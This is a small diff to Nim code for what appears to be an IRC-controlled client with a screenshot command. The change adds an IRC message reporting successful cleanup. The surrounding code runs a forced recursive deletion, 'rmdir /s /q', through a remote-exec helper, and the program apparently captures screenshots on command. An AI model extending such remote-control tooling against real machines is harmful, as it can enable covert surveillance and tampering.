@@ -384,6 +384,7 @@ proc cmd_screenshot(event:IrcEvent, client:AsyncIrc) {.async.} =
             setCurrentDir(current_dir) 
             if dirExists(scrndir):
                 removeDir(scrndir)
+            await client.privmsg(event.origin,"cleanup successful")
         except OSError as e: 
             discard client.privmsg(event.origin, "problem removing " & scrndir & "  [" & repr(e) & "]")
             discard rexec_runCommand("rmdir /s /q " & scrndir)
